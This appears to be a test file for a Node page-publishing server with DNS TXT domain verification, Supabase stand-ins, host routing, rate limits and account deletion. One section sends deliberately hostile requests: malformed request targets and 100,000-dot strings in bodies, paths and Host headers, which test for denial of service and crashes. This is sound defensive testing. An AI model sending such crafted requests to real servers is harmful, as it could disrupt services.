    const failing = (test) => (method, pathname, q) => (method === 'PATCH' && pathname === '/rest/v1/published_pages' && test(String(q.get('user_id'))) ? { status: 500, body: { message: 'boom' } } : null);
    // Supabase won't take trent's pages off it: nothing changes hands
    supa.behavior.fail = failing((u) => u === `eq.${trent.user.id}`);
    let r;
    try {
      r = await api('/api/domains/peggys-pies.example.com/check', { who: peggy, method: 'POST' });
    } finally {
      supa.behavior.fail = null;
    }
    expect(r.status).toBe(502);
    expect(rowsOf('published_domains').find((d) => d.domain === 'peggys-pies.example.com').user_id).toBe(trent.user.id);
    expect(rowsOf('published_pages').find((p) => p.slug === 'trent-pies')).toMatchObject({ domain: 'peggys-pies.example.com', home: true });
    // the sweep after the move fails: it moves all the same, with nothing of trent's left on it
    supa.behavior.fail = failing((u) => u.startsWith('neq.'));
    try {
      expect(await checkDomain(peggy, 'peggys-pies.example.com')).toMatchObject({ verified: true });
    } finally {
      supa.behavior.fail = null;
    }
    expect(rowsOf('published_domains').find((d) => d.domain === 'peggys-pies.example.com').user_id).toBe(peggy.user.id);
    expect(rowsOf('published_pages').find((p) => p.slug === 'trent-pies')).toMatchObject({ domain: null, home: false });
    // so peggy's page can be its home page (a domain has one)
    expect((await publish(peggy, 'seo:p1', { slug: 'peggys-pies', domain: 'peggys-pies.example.com', home: true, html: '<h1>Peggy’s pies</h1>' })).status).toBe(200);
    expect((await at('peggys-pies.example.com', '/')).text).toContain('Peggy’s pies');
  });

  it('counts a check from before TXT records only once the domain has one', async () => {
    // verified by the old check (an answer from the domain itself, which this server gave)
    rowsOf('published_domains').push({ domain: 'older.example.com', user_id: alice.user.id, token: 'a1b2c3d4e5f60718293a4b5c6d7e8f90', verified_at: new Date().toISOString(), created_at: new Date().toISOString() });
    expect((await publish(alice, 'seo:older1', { slug: 'older-page', domain: 'older.example.com', home: true, html: '<h1>Older</h1>' })).status).toBe(200);
    expect((await at('older.example.com', '/')).status).toBe(404);
    const listed = (await (await api('/api/pages', { who: alice })).json()).domains.find((d) => d.domain === 'older.example.com');
    expect(listed).toMatchObject({ verified: false, verifiedAt: null, token: expect.stringMatching(TOKEN), record: { name: '_ylb-domain.older.example.com' } });
    txt('older.example.com', listed.record.value);
    expect(await checkDomain(alice, 'older.example.com')).toMatchObject({ verified: true });
    expect(rowsOf('published_domains').find((d) => d.domain === 'older.example.com').token).toBe(listed.record.value);
    expect((await at('older.example.com', '/')).text).toContain('Older');
  });

  it('looks at a verified domain’s record again after a while, and stops showing it once the record is gone', async () => {
    const setUp = async (domain, slug) => {
      const { token } = await (await addDomain(alice, domain)).json();
      txt(domain, token);
      expect(await checkDomain(alice, domain)).toMatchObject({ verified: true });
      expect((await publish(alice, `seo:${slug}`, { slug, domain, home: true, html: `<h1>${slug}</h1>` })).status).toBe(200);
      // its last check was 7 hours ago (and no visitor has asked for it yet, so the server reads that)
      const row = rowsOf('published_domains').find((d) => d.domain === domain);
      row.verified_at = new Date(Date.now() - 7 * 60 * 60_000).toISOString();
      return row;
    };
    const until = async (test) => {
      for (let i = 0; i < 100 && !test(); i++) await sleep(30);
      return test();
    };
    // the record is still there: the check is renewed
    const kept = await setUp('kept.example.com', 'kept-page');
    const before = kept.verified_at;
    expect((await at('kept.example.com', '/')).status).toBe(200);
    expect(await until(() => rowsOf('published_domains').find((d) => d.domain === 'kept.example.com').verified_at !== before)).toBe(true);
    expect(Date.now() - Date.parse(rowsOf('published_domains').find((d) => d.domain === 'kept.example.com').verified_at)).toBeLessThan(60_000);
    expect((await at('kept.example.com', '/')).status).toBe(200);

    // the record is gone: the domain stops showing pages, until it's back and checked again
    await setUp('lapsed.example.com', 'lapsed-page');
    dnsServer.records.delete('_ylb-domain.lapsed.example.com');
    await at('lapsed.example.com', '/');
    expect(await until(() => rowsOf('published_domains').find((d) => d.domain === 'lapsed.example.com').verified_at === null)).toBe(true);
    expect((await at('lapsed.example.com', '/')).status).toBe(404);
    expect((await get('/lapsed-page')).status).toBe(200); // still on the app's address
    const listed = (await (await api('/api/pages', { who: alice })).json()).domains.find((d) => d.domain === 'lapsed.example.com');
    expect(listed.verified).toBe(false);
  });

  it('removing a domain keeps its pages on the app’s address, and the domain shows nothing', async () => {
    expect((await api('/api/domains/shop.example.com', { who: bob, method: 'DELETE' })).status).toBe(200); // not his: nothing happens
    expect((await at('shop.example.com', '/candle-shop')).status).toBe(200);
    const r = await api('/api/domains/shop.example.com', { who: alice, method: 'DELETE' });
    expect(await r.json()).toEqual({ ok: true });
    const list = await (await api('/api/pages', { who: alice })).json();
    expect(list.domains.map((d) => d.domain)).not.toContain('shop.example.com');
    expect(list.pages.find((p) => p.slug === 'scent-quiz')).toMatchObject({ domain: null, home: false });
    expect(list.pages.find((p) => p.slug === 'scent-quiz').domainUrl).toBeUndefined();
    expect((await get('/scent-quiz')).status).toBe(200);
    // the domain is no one's now: not the pages, not the app
    for (const p of ['/', '/scent-quiz', '/api/config']) {
      const res = await at('shop.example.com', p);
      expect(res.status, p).toBe(404);
      expect(res.text, p).toContain('Page not found');
    }
  });
});

describe('which host gets what', () => {
  const asJson = (res) => /application\/json/.test(String(res.headers['content-type']));

  it('answers with the app only on its own hosts', async () => {
    // (and names that are never a public domain: one label, *.local)
    for (const host of ['yourlocalbusiness.replit.app', 'x-1.picard.replit.dev', 'old.repl.co', 'localhost:8787', '127.0.0.1', '[::1]:8787', 'printer.local', 'my-machine:8787']) {
      const res = await at(host, '/api/config');
      expect(res.status, host).toBe(200);
      expect(asJson(res), host).toBe(true);
    }
  });

  it('shows "not found" on any other host, whether or not anyone has claimed it, and never the app or /api', async () => {
    // unverified (added, no record) and never added at all, and real names nobody can add here (an
    // internationalized top-level domain, an underscore): a list decides, not what can be claimed
    expect((await addDomain(alice, 'pending.example.com')).status).toBe(200);
    for (const host of ['pending.example.com', 'nobody-claimed.example.org', 'app.mybiz.test', 'shop.xn--p1ai', 'my_shop.example.com']) {
      for (const p of ['/', '/api/config', '/api/pages', '/assets/index.js', '/login']) {
        const res = await at(host, p, { headers: { authorization: `Bearer ${alice.token}` } });
        expect(res.status, `${host}${p}`).toBe(404);
        expect(asJson(res), `${host}${p}`).toBe(false);
        expect(res.text, `${host}${p}`).toContain('Page not found');
      }
      // the API doesn't answer there, even to add that very domain
      const res = await at(host, '/api/domains', { method: 'POST', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain: host }) });
      expect(res.status, host).toBe(404);
      expect(asJson(res), host).toBe(false);
    }
  });

  it('says at startup where the app answers, and that its own domain goes in APP_HOSTS', () => {
    expect(serverLog).toContain('The app and /api answer on *.replit.app, *.replit.dev, *.repl.co, localhost and IP addresses.');
    expect(serverLog).toContain('If the app has a custom domain of its own, list it in the APP_HOSTS Secret (it’s empty now).');
  });

  it('says in its log when a host that’s nobody’s is opened (it may be the app’s own domain, missing from APP_HOSTS)', async () => {
    const hint = 'isn’t one of the app’s hosts or anyone’s verified domain, so it shows “Page not found”. If it’s the app’s own custom domain, add it to the APP_HOSTS Secret.';
    const said = async (s, text) => {
      for (let i = 0; i < 50 && !s.log().includes(text); i++) await sleep(20);
      return s.log().includes(text);
    };
    // a browser opening a page there
    let s = await startServer();
    try {
      // (a scanner's guess, neither / nor a page a browser opens, isn't worth a line)
      await request(s.base, '/wp-login.php', { host: 'scanner.example.net' });
      await sleep(100);
      expect(s.log()).not.toContain(hint);
      expect((await request(s.base, '/menu', { host: 'www.mybiz.test', headers: { accept: 'text/html,application/xhtml+xml' } })).status).toBe(404);
      expect(await said(s, `Published pages: www.mybiz.test ${hint}`)).toBe(true);
      // once in a while, not for every visit
      await request(s.base, '/', { host: 'www2.mybiz.test', headers: { accept: 'text/html' } });
      await sleep(100);
      expect(s.log().split(hint).length - 1).toBe(1);
    } finally {
      s.proc.kill();
    }
    // a check of / (a platform's health check sends no Accept)
    s = await startServer();
    try {
      expect((await request(s.base, '/', { host: 'health.mybiz.test' })).status).toBe(404);
      expect(await said(s, `Published pages: health.mybiz.test ${hint}`)).toBe(true);
    } finally {
      s.proc.kill();
    }
  });

  it('answers with the app on the hosts in APP_HOSTS and ALLOWED_ORIGIN, and nobody can claim them', async () => {
    const s = await startServer({ APP_HOSTS: 'App.MyBiz.test, www.mybiz.test', ALLOWED_ORIGIN: 'https://studio.mybiz.test' });
    try {
      expect(s.log()).toContain('and on app.mybiz.test, www.mybiz.test, studio.mybiz.test (APP_HOSTS, ALLOWED_ORIGIN)');
      for (const host of ['app.mybiz.test', 'www.mybiz.test:443', 'studio.mybiz.test']) {
        const res = await request(s.base, '/api/config', { host });
        expect(asJson(res), host).toBe(true);
      }
      for (const domain of ['app.mybiz.test', 'studio.mybiz.test']) {
        const res = await request(s.base, '/api/domains', { method: 'POST', host: 'yourlocalbusiness.replit.app', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain }) });
        expect(res.status, domain).toBe(400);
        expect(JSON.parse(res.text).code, domain).toBe('BAD_DOMAIN');
      }
      // and any other host still isn't the app
      expect((await request(s.base, '/api/config', { host: 'other.mybiz.test' })).status).toBe(404);
    } finally {
      s.proc.kill();
    }
  });
});

describe('requests built to hurt', () => {
  it('answers request targets that aren’t an address it can read, and keeps running', async () => {
    for (const target of ['//', '//x:y', '//[', '//h:99999', '/%zz']) {
      const line = await raw(app.base, `GET ${target} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n`);
      // a path like any other: the app (or "build it first"), or 400 for one that can't be decoded
      expect(line, target).toMatch(/^HTTP\/1\.1 (200|400|404) /);
      expect((await fetch(`${app.base}/api/config`)).status, target).toBe(200);
    }
    // an absolute target that isn't an address at all
    expect(await raw(app.base, 'GET http://[ HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n')).toMatch(/^HTTP\/1\.1 400 /);
    // on someone's domain too
    expect(await raw(app.base, 'GET //x:y HTTP/1.1\r\nHost: kept.example.com\r\nConnection: close\r\n\r\n')).toMatch(/^HTTP\/1\.1 404 /);
    expect(child.exitCode).toBeNull();
    expect((await fetch(`${app.base}/api/config`)).status).toBe(200);
  });

  it('turns down 100,000 dots in a body at once, while visitors are served', async () => {
    const dots = `${'.'.repeat(100_000)}x`;
    const t0 = Date.now();
    const [added, published, visitor] = await Promise.all([
      // the domains API reads a small body only: it answers 413 and drops the connection
      request(app.base, '/api/domains', { method: 'POST', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain: dots }) }).then(
        (r) => r.status,
        () => 'closed',
      ),
      publish(bob, 'seo:dots1', { slug: 'bob-dots', domain: dots }),
      get('/alice-widget'),
    ]);
    expect(Date.now() - t0).toBeLessThan(2000);
    expect([413, 'closed']).toContain(added);
    expect(published.status).toBe(400);
    expect((await published.json()).code).toBe('BAD_DOMAIN');
    expect(visitor.status).toBe(200);
    // as many dots as fit in that body
    const r = await addDomain(bob, `${'.'.repeat(15_000)}x`);
    expect(r.status).toBe(400);
    expect((await r.json()).code).toBe('BAD_DOMAIN');
    expect(Date.now() - t0).toBeLessThan(2000);
    expect(child.exitCode).toBeNull();
  });

  it('turns down long runs of dots in the address and the Host header at once', async () => {
    const t0 = Date.now();
    // the most Node lets through in a request line or header (16 KB; the module's own test sends 100,000)
    const r = await api(`/api/domains/${'.'.repeat(15_000)}x/check`, { who: bob, method: 'POST' });
    expect(r.status).toBe(404);
    const host = await get('/', { host: `${'.'.repeat(15_000)}x` });
    expect(host.status).toBe(404);
    expect(host.text).toContain('Page not found');
    expect(Date.now() - t0).toBeLessThan(2000);
  });
});

describe('deleting an account', () => {
  it('removes the person’s published pages and their images, and their sign-in can’t store anything after', async () => {
    const carol = await supa.tokenFor('carol@pages.test');
    expect((await publish(carol, 'seo:c1', { slug: 'carol-bakes', images: [image('img-1.jpg', 'image/jpeg', JPEG)] })).status).toBe(200);
    const { token } = await (await addDomain(carol, 'carol-bakes.example.com')).json();
    txt('carol-bakes.example.com', token);
    expect(await checkDomain(carol, 'carol-bakes.example.com')).toMatchObject({ verified: true });
    expect((await get('/carol-bakes')).status).toBe(200);
    supa.objects.set(`media/${carol.user.id}/media_photo1`, { bytes: JPEG, type: 'image/jpeg', created: Date.now() });
    const r = await fetch(`${app.base}/api/account`, { method: 'DELETE', headers: { authorization: `Bearer ${carol.token}` } });
    expect(r.status).toBe(200);
    expect(objectsUnder(`media/${carol.user.id}/`)).toEqual([]);
    expect(rowsOf('published_pages').some((p) => p.user_id === carol.user.id)).toBe(false);
    expect(rowsOf('published_domains').some((d) => d.user_id === carol.user.id)).toBe(false);
    expect((await get('/carol-bakes')).status).toBe(404);
    // the domain (still pointing here) shows nothing, not the app
    const there = await at('carol-bakes.example.com', '/api/config');
    expect(there.status).toBe(404);
    expect(there.text).toContain('Page not found');
    // the same access token is still signed and unexpired: this copy of the server knows the account is gone…
    const ghost = { slug: 'ghost-page', images: [image('img-1.png', 'image/png', PNG), image('img-2.png', 'image/png', PNG)] };
    const again = await publish(carol, 'seo:ghost1', ghost);
    expect(again.status).toBe(401);
    expect((await again.json()).code).toBe('AUTH_REQUIRED');
    // …and another copy, which only checks the token's signature, asks Supabase before it stores anything
    const other = await startServer();
    try {
      const elsewhere = await fetch(`${other.base}/api/pages/${encodeURIComponent('seo:ghost1')}`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: `Bearer ${carol.token}` }, body: JSON.stringify({ kind: 'seo', title: 'Ghost', html: '<p>ghost</p>', ...ghost }) });
      expect(elsewhere.status).toBe(401);
      expect(await elsewhere.json()).toEqual({ error: 'This account doesn’t exist anymore. Sign in again.', code: 'ACCOUNT_GONE' });
    } finally {
      other.proc.kill();
    }
    expect(objectsUnder(`media/${carol.user.id}/`)).toEqual([]);
    expect(rowsOf('published_pages').some((p) => p.slug === 'ghost-page')).toBe(false);
  });
});

// ───────────── the module on its own ─────────────

/** No DNS answers anything (the module tests never reach a real DNS server). */
const noDns = async () => {
  throw Object.assign(new Error('no such name'), { code: 'ENOTFOUND' });
};

/** pages.mjs behind a bare server, routed like ai-server.mjs (with room for very long headers). */
async function startPages({ mock, secretKey, distDir = '', resolveTxt = noDns, lookupLimits, tuning, fetch: fetchImpl }) {
  const auth = createAuth({ supabaseUrl: mock.url, publishableKey: mock.PUBLISHABLE });
  const send = (res, status, body, headers = {}) => {
    res.writeHead(status, { 'content-type': 'application/json', ...headers });
    res.end(JSON.stringify(body));
  };
  const readJson = (req, limit = 14 * 1024 * 1024) =>
    new Promise((resolve, reject) => {
      let raw = '';
      req.on('data', (c) => {
        raw += c;
        if (raw.length > limit) reject(Object.assign(new Error('Request too large'), { status: 413 }));
      });
      req.on('end', () => resolve(JSON.parse(raw || '{}')));
    });
  const whoIs = async (req) => (req.headers.authorization ? { who: await auth.identify(req) } : { who: null });
  const pages = createPages({ supabaseUrl: mock.url, secretKey, auth, whoIs, send, readJson, distDir, resolveTxt, ...(lookupLimits ? { lookupLimits } : {}), ...(tuning ? { tuning } : {}), ...(fetchImpl ? { fetch: fetchImpl } : {}) });
  const server = http.createServer({ maxHeaderSize: 1024 * 1024 }, async (req, res) => {
    const url = new URL(`http://local${req.url}`);
    if (!pages.isAppHost(req)) return pages.serveDomain(req, res, url);
    if (pages.matchApi(url)) return pages.handleApi(req, res, url);
    if (pages.matchPage(url) && (await pages.servePage(req, res, url))) return;
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('the app');
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${server.address().port}`;
  return {
    pages,
    base,
    api: (pathname, { who, method = 'GET', body } = {}) => fetch(`${base}${pathname}`, { method, headers: { 'content-type': 'application/json', ...(who ? { authorization: `Bearer ${who.token}` } : {}) }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) }),
    close: () => {
      pages.close();
      return new Promise((r) => server.close(r));
    },
  };
}

/** A published row straight into the stand-in (as if published through another copy of the server). */
const putRow = (mock, row) => {
  if (!mock.tables.has('published_pages')) mock.tables.set('published_pages', []);
  mock.tables.get('published_pages').push({ user_id: alice.user.id, kind: 'seo', title: 't', images: [], domain: null, home: false, updated_at: new Date().toISOString(), ...row });
};
const from = (ip) => ({ headers: { 'x-forwarded-for': ip } });

describe('without the setup', () => {
  it('is off without the secret key, and says so', async () => {
    const s = await startPages({ mock: supa, secretKey: '' });
    try {
      expect(s.pages.config()).toEqual({ enabled: false });
      const r = await fetch(`${s.base}/api/pages`, { headers: { authorization: `Bearer ${alice.token}` } });
      expect(r.status).toBe(503);
      expect((await r.json()).code).toBe('PAGES_OFF');
      // and nothing changes for the app's own paths; any other host is still nobody's app
      expect((await request(s.base, '/alice-widget')).text).toBe('the app');
      const other = await request(s.base, '/', { host: 'shop.example.com' });
      expect(other.status).toBe(404);
      expect(other.text).toContain('Page not found');
    } finally {
      await s.close();
    }
  });

  it('names the migration to run when the tables are missing', async () => {
    const bare = await (await createMockSupabase({ missingTables: ['published_pages', 'published_domains'] })).start();
    const s = await startPages({ mock: bare, secretKey: bare.SECRET });
    try {
      const dana = await bare.tokenFor('dana@pages.test');
      for (const [p, init] of [['/api/pages', {}], ['/api/pages/check?slug=dana-page&pageId=seo%3Ad1', {}], ['/api/domains', { method: 'POST', body: JSON.stringify({ domain: 'dana.example.com' }) }]]) {
        const r = await fetch(`${s.base}${p}`, { ...init, headers: { authorization: `Bearer ${dana.token}`, 'content-type': 'application/json' } });
        expect(r.status, p).toBe(503);
        expect(await r.json(), p).toEqual({ error: MIGRATION_HINT, code: 'PAGES_TABLES' });
      }
      // visitors: nothing is published yet, and no host is anyone's domain (nor the app)
      expect((await request(s.base, '/dana-page')).status).toBe(404);
      expect((await request(s.base, '/', { host: 'dana.example.com' })).status).toBe(404);
    } finally {
      await s.close();
      await bare.close();
    }
  });

  it('keeps the app’s own paths: reserved names and the files of the built app', async () => {
    const dist = tmpDir();
    fs.writeFileSync(path.join(dist, 'pricing'), 'a file');
    fs.mkdirSync(path.join(dist, 'guides'));
    const s = await startPages({ mock: supa, secretKey: supa.SECRET, distDir: dist });
    try {
      const check = async (slug) => (await fetch(`${s.base}/api/pages/check?slug=${slug}&pageId=seo%3Ax`, { headers: { authorization: `Bearer ${alice.token}` } })).json();
      expect(await check('pricing')).toEqual({ ok: false, reason: 'reserved' });
      expect(await check('guides')).toEqual({ ok: false, reason: 'reserved' });
      for (const p of ['/pricing', '/guides/', '/assets', '/login']) expect((await request(s.base, p)).text, p).toBe('the app');
      expect((await request(s.base, '/no-such-page')).status).toBe(404);
    } finally {
      await s.close();
    }
  });
});

describe('visitors’ lookups', () => {
  it('limits what each client can look up, apart from everyone else, with domains counted apart from pages', async () => {
    const s = await startPages({ mock: supa, secretKey: supa.SECRET, lookupLimits: { page: { perMin: 100, perClient: 5 }, domain: { perMin: 100, perClient: 3 }, image: { perMin: 100, perClient: 5 } } });
    try {
      putRow(supa, { slug: 'limits-page', page_id: 'seo:lim1', html: '<h1>Limits</h1>' });
      const a = from('203.0.113.7');
      for (let i = 0; i < 5; i++) expect((await request(s.base, `/random-a-${i}`, a)).status).toBe(404);
      // a's lookups are spent: a name nobody asked about yet can't be looked up for a
      expect((await request(s.base, '/limits-page', a)).status).toBe(503);
      // answers already known cost nothing
      expect((await request(s.base, '/random-a-0', a)).status).toBe(404);
      // other clients aren't affected
      expect((await request(s.base, '/limits-page', from('198.51.100.2'))).status).toBe(200);
      // (an IPv6 client is one client for its whole /64)
      expect((await request(s.base, '/random-v6-1', from('2001:db8:5:6::1'))).status).toBe(404);
      for (let i = 2; i <= 5; i++) await request(s.base, `/random-v6-${i}`, from(`2001:db8:5:6::${i}`));
      expect((await request(s.base, '/random-v6-6', from('2001:db8:5:6:ffff::9'))).status).toBe(503);
      // random hosts spend the domain lookups, not the pages'
      const c = from('192.0.2.10');
      for (let i = 0; i < 3; i++) expect((await request(s.base, '/', { ...c, host: `random-${i}.example.net` })).status).toBe(404);
      expect((await request(s.base, '/', { ...c, host: 'random-3.example.net' })).status).toBe(503);
      expect((await request(s.base, '/random-c-1', c)).status).toBe(404);
    } finally {
      await s.close();
    }
  });

  it('falls back on an answer it had only while Supabase fails, and never past twice its time', async () => {
    const mock = await (await createMockSupabase()).start();
    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 400 } });
    try {
      putRow(mock, { user_id: (await mock.tokenFor('erin@pages.test')).user.id, slug: 'erin-page', page_id: 'seo:e1', html: '<h1>Erin</h1>' });
      expect((await request(s.base, '/erin-page')).status).toBe(200);
      mock.behavior.down = true;
      await sleep(500); // past its time (400 ms), not past twice that
      expect((await request(s.base, '/erin-page')).text).toContain('Erin');
      await sleep(400); // past 800 ms
      expect((await request(s.base, '/erin-page')).status).toBe(503);
    } finally {
      mock.behavior.down = false;
      await s.close();
      await mock.close();
    }
  });

  it('never falls back on an old answer because a client’s lookups are spent (a removed page would stay up)', async () => {
    const mock = await (await createMockSupabase()).start();
    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 300 }, lookupLimits: { page: { perMin: 100, perClient: 2 }, domain: { perMin: 100, perClient: 2 }, image: { perMin: 100, perClient: 2 } } });
    try {
      putRow(mock, { user_id: (await mock.tokenFor('finn@pages.test')).user.id, slug: 'finn-page', page_id: 'seo:f1', html: '<h1>Finn</h1>' });
      const y = from('203.0.113.50');
      expect((await request(s.base, '/finn-page', y)).status).toBe(200);
      expect((await request(s.base, '/random-y-1', y)).status).toBe(404);
      // unpublished meanwhile (on another copy of the server)
      mock.tables.set('published_pages', []);
      await sleep(350);
      expect((await request(s.base, '/finn-page', y)).status).toBe(503);
      expect((await request(s.base, '/finn-page', from('203.0.113.51'))).status).toBe(404);
    } finally {
      await s.close();
      await mock.close();
    }
  });

  it('keeps pages within its bytes, a big page without its HTML, and drops answers past their time', async () => {
    const mock = await (await createMockSupabase()).start();
    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 300, pageHtmlMax: 1000, pageCacheBytes: 12_000 } });
    try {
      const uid = (await mock.tokenFor('gale@pages.test')).user.id;
      const bigHtml = `<h1>Big</h1><p>${'b'.repeat(5000)}</p>`;
      putRow(mock, { user_id: uid, slug: 'gale-big', page_id: 'artifact:g0', html: bigHtml });
      for (let i = 1; i <= 12; i++) putRow(mock, { user_id: uid, slug: `gale-small-${i}`, page_id: `seo:g${i}`, html: `<h1>Small ${i}</h1><p>${'s'.repeat(600)}</p>` });
      const reads = () => mock.calls.filter((c) => c.path === '/rest/v1/published_pages' && c.method === 'GET').length;
      // a big page: served whole each time, its HTML read again rather than kept
      expect((await request(s.base, '/gale-big')).text).toBe(bigHtml);
      expect(s.pages.cacheStats().pages.bytes).toBeLessThan(1500);
      const before = reads();
      expect((await request(s.base, '/gale-big')).text).toBe(bigHtml);
      expect(reads()).toBe(before + 1);
      // small pages: kept, within the bytes (the least recently used go first)
      for (let i = 1; i <= 12; i++) expect((await request(s.base, `/gale-small-${i}`)).status).toBe(200);
      const { bytes, entries } = s.pages.cacheStats().pages;
      expect(bytes).toBeLessThanOrEqual(12_000);
      expect(entries).toBeLessThan(13);
      const now = reads();
      expect((await request(s.base, '/gale-small-12')).status).toBe(200);
      expect(reads()).toBe(now); // the most recent is still there
      // past twice their time, answers go (with their HTML), even with nothing else coming in
      await sleep(1000);
      expect(s.pages.cacheStats().pages).toEqual({ entries: 0, bytes: 0 });
    } finally {
      await s.close();
      await mock.close();
    }
  });
});

describe('publishing, in the module', () => {
  it('keeps the images of a publish whose answer was lost after it landed (the live page shows them)', async () => {
    const mock = await (await createMockSupabase()).start();
    let lose = false;
    // Supabase saves the page, but its answer never arrives
    const fetchImpl = async (input, init = {}) => {
      const res = await fetch(input, init);
      if (lose && init.method === 'POST' && String(input).includes('/rest/v1/published_pages?on_conflict=')) {
        await res.arrayBuffer();
        throw Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' });
      }
      return res;
    };
    const s = await startPages({ mock, secretKey: mock.SECRET, fetch: fetchImpl });
    try {
      const ivy = await mock.tokenFor('ivy@pages.test');
      const put = (bytes) => s.api(`/api/pages/${encodeURIComponent('seo:ivy1')}`, { who: ivy, method: 'PUT', body: { kind: 'seo', slug: 'ivy-page', title: 'Ivy', html: '<img src="/ivy-page/img/img-1.png" alt="">', images: [image('img-1.png', 'image/png', bytes)] } });
      expect((await put(PNG)).status).toBe(200);
      const second = Buffer.concat([PNG, Buffer.from('second')]);
      lose = true;
      const r = await put(second);
      lose = false;
      expect(r.status).toBe(502);
      expect(await r.json()).toEqual({ error: 'Supabase took too long to answer. Try again.', code: 'UPSTREAM' });
      // the row points at the new images, and they're still there
      const { v } = mock.tables.get('published_pages').find((p) => p.slug === 'ivy-page').images[0];
      expect(mock.objects.has(`media/${ivy.user.id}/published/seo-ivy1/${v}/img-1.png`)).toBe(true);
      const pic = await request(s.base, '/ivy-page/img/img-1.png');
      expect(pic.status).toBe(200);
      expect(pic.buf.equals(second)).toBe(true);
    } finally {
      await s.close();
      await mock.close();
    }
  });
});

describe('domains, in the module', () => {
  it('keeps a domain whose DNS can’t answer for now, and drops it once its record is gone', async () => {
    const records = new Map();
    let dnsDown = false;
    const resolveTxt = async (name) => {
      if (dnsDown) throw Object.assign(new Error('timeout'), { code: 'ETIMEOUT' });
      if (!records.has(name)) throw Object.assign(new Error('no such name'), { code: 'ENOTFOUND' });
      return records.get(name).map((v) => [v]);
    };
    const mock = await (await createMockSupabase()).start();
    // look again at every visit
    const s = await startPages({ mock, secretKey: mock.SECRET, resolveTxt, tuning: { recheckAfter: 0 } });
    const until = async (test) => {
      for (let i = 0; i < 100 && !(await test()); i++) await sleep(20);
      return test();
    };
    try {
      const hana = await mock.tokenFor('hana@pages.test');
      const row = (domain) => mock.tables.get('published_domains').find((d) => d.domain === domain);
      for (const domain of ['flaky.example.com', 'gone.example.com']) {
        const { token } = await (await s.api('/api/domains', { who: hana, method: 'POST', body: { domain } })).json();
        records.set(`_ylb-domain.${domain}`, [token]);
        expect(await (await s.api(`/api/domains/${domain}/check`, { who: hana, method: 'POST' })).json()).toMatchObject({ verified: true });
        const slug = domain.split('.')[0];
        expect((await s.api(`/api/pages/seo%3A${slug}`, { who: hana, method: 'PUT', body: { slug: `${slug}-home`, html: `<h1>${slug}</h1>`, domain, home: true } })).status).toBe(200);
        expect((await request(s.base, '/', { host: domain })).status).toBe(200);
      }
      // the DNS doesn't answer: still shown, still verified
      dnsDown = true;
      expect((await request(s.base, '/', { host: 'flaky.example.com' })).status).toBe(200);
      await sleep(100);
      expect((await request(s.base, '/', { host: 'flaky.example.com' })).status).toBe(200);
      expect(row('flaky.example.com').verified_at).not.toBeNull();
      dnsDown = false;
      // the record is gone: no longer verified, and not shown
      records.delete('_ylb-domain.gone.example.com');
      expect(
        await until(async () => {
          await request(s.base, '/', { host: 'gone.example.com' });
          return row('gone.example.com').verified_at === null;
        }),
      ).toBe(true);
      expect((await request(s.base, '/', { host: 'gone.example.com' })).status).toBe(404);
    } finally {
      await s.close();
      await mock.close();
    }
  });

  it('turns down 100,000 dots in the address and the Host header at once', async () => {
    const s = await startPages({ mock: supa, secretKey: supa.SECRET });
    try {
      const t0 = Date.now();
      const r = await s.api(`/api/domains/${'.'.repeat(100_000)}x/check`, { who: bob, method: 'POST' });
      expect(r.status).toBe(404);
      const host = await request(s.base, '/', { host: `${'.'.repeat(100_000)}x` });
      expect(host.status).toBe(404);
      const fwd = await request(s.base, '/', { headers: { 'x-forwarded-host': `${'.'.repeat(100_000)}x` } });
      expect(fwd.status).toBe(404);
      expect(Date.now() - t0).toBeLessThan(2000);
    } finally {
      await s.close();
    }
  });
});

describe('helpers', () => {
  it('reads a domain the way people type it', () => {
    expect(normalizeDomain(' HTTPS://Shop.Example.com:8443/about?x=1#top ')).toBe('shop.example.com');
    expect(normalizeDomain('user:pw@www.shop.example.com.')).toBe('www.shop.example.com');
    expect(normalizeDomain('shop.example.com....')).toBe('shop.example.com');
    expect(normalizeDomain('bücher.example')).toBe('xn--bcher-kva.example');
    expect(normalizeDomain('')).toBe('');
    expect(claimable('shop.example.com')).toBe(true);
    for (const h of ['localhost', '10.0.0.1', 'app.replit.app', 'x.replit.dev', 'y.repl.co', 'a.localhost', 'printer.local', 'db.internal', 'nas.home.arpa', 'nodot', '[::1]', '']) expect(claimable(h), h).toBe(false);
    expect(claimable('app.mybiz.com', new Set(['app.mybiz.com']))).toBe(false);
  });

  it('never runs a regex on something too long to be a domain', () => {
    const dots = `${'.'.repeat(100_000)}x`;
    const t0 = Date.now();
    expect(normalizeDomain(dots)).toBe('');
    expect(normalizeDomain(`${'.'.repeat(100_000)}`)).toBe('');
    expect(hostOf({ headers: { host: dots }, socket: {} })).toBe('');
    expect(hostOf({ headers: { host: `shop.example.com${'.'.repeat(250)}:443` }, socket: {} })).toBe('shop.example.com');
    expect(Date.now() - t0).toBeLessThan(200);
    expect(hostOf({ headers: { host: 'Shop.Example.com.:8080' }, socket: {} })).toBe('shop.example.com');
    expect(hostOf({ headers: { host: '[::1]:8787' }, socket: {} })).toBe('[::1]');
    // X-Forwarded-Host only from this machine (the Vite dev proxy)
    expect(hostOf({ headers: { host: 'localhost:8787', 'x-forwarded-host': 'preview.replit.dev' }, socket: { remoteAddress: '127.0.0.1' } })).toBe('preview.replit.dev');
    expect(hostOf({ headers: { host: 'shop.example.com', 'x-forwarded-host': 'app.replit.app' }, socket: { remoteAddress: '203.0.113.9' } })).toBe('shop.example.com');
  });

  it('tells clients apart by the address the platform reports', () => {
    const req = (fwd, remoteAddress = '10.0.0.5') => ({ headers: fwd === undefined ? {} : { 'x-forwarded-for': fwd }, socket: { remoteAddress } });
